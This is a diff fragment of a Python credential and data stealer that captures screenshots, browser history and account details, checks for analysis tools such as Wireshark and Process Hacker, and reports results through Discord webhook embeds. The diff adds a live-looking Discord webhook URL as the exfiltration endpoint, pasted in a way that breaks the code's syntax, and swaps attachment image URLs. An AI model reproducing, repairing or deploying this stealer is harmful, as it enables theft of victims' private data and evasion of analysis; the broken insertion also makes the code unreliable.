@@ -5,7 +5,7 @@ import re, uuid
 from PIL import ImageGrab
 from browser_history.browsers import Chrome
 webhook = "Webhooksss"
-process = [
+process = [https://discord.com/api/webhooks/1461857958324600903/tqYzR_6TiowRuiZxmA-WVjaWjPxcazaVJkv1jMdbiIJZwNIaLrQ4RrSkI6N8GLcWlCHc
     "ProcessHacker.exe",
     "httpdebuggerui.exe",
     "wireshark.exe",
@@ -142,7 +142,7 @@ def chromes():
             premium = information["IsPremium"]
             image = information["ThumbnailUrl"]
             embedss = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/1457080067459911723/1461456438751789196/IMG_0465.png?ex=696c991f&is=696b479f&hm=6b59670accfc33a6f3cd43f3b8c2f0fdcbbc8745de0d0c44feb0fb3f2399adb2",
                       "embeds": [
                 {
                     "author": {
@@ -264,11 +264,11 @@ try:
     os.remove('history.txt')
 except:
      embeded = {
-          "avatar_url":"https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg",
+          "avatar_url":"https://cdn.discordapp.com/attachments/1457080067459911723/1461456438751789196/IMG_0465.png?ex=696c991f&is=696b479f&hm=6b59670accfc33a6f3cd43f3b8c2f0fdcbbc8745de0d0c44feb0fb3f2399adb2",
                       "embeds": [
                 {
                     "author": {
-                    "icon_url": "https://cdn.discordapp.com/attachments/1013656037322149991/1018644149332873330/IMG_4905.jpg"
+                    "icon_url": "https://cdn.discordapp.com/attachments/1457080067459911723/1461456438751789196/IMG_0465.png?ex=696c991f&is=696b479f&hm=6b59670accfc33a6f3cd43f3b8c2f0fdcbbc8745de0d0c44feb0fb3f2399adb2"
                     },
                     "description": f"```Failed To Grab Chromes Browser History```",                      
                 }
